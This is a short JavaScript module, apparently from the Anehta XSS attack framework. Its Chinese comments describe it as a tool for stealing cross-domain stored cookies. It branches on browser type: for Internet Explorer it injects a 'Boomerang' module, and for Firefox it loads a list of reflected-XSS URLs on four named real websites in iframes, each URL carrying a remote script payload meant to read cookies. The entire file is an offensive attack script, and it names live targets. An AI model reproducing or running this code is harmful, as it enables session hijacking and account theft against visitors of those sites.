//alert("xcookie.js");
///////////////////////////////////////////////////
//// 偷取跨域 Stored Cookies //////////////////////
//// Author: axis
//// boomerang/gifar/flash/iframe//////////////////
///////////////////////////////////////////////////

// 先判断浏览器版本 $.browser.msie/safari/opera/mozilla
if ($.browser.msie){
	//alert("ie"+$.browser.version);
	//IE最好只通过回旋镖模块获取一次
	anehta.inject.AddScript(BoomerangMod);
	
} else if ($.browser.mozilla){ 
	//alert("mozilla"+$.browser.version);
	var target_url = new Array( // 远程xss trigger; 这里只在远程加载clxmod以获取cookie.
	                     "http://www.playback.fr/recherche.php?search=<script src="+ClxMod+"></script>+&button=OK",
	                     "http://www.gobolinux.org/?page=<script src="+ClxMod+"></script>",
	                     "http://www.underwoodlandcompany.com/?pg=asdf<script src="+ClxMod+"></script>",
	                     "http://www.waikikicondosearch.com/?pg=asdf<script src="+ClxMod+"></script>"
	                     );
	
	
	// 因为mozilla/firefox 的iframe,img 不拦截stored cookie
	// 所以可以直接利用这些标签
	$.each(target_url, function(){
		//alert(this);
		anehta.inject.injectIframe(this);	
		}
		);	
}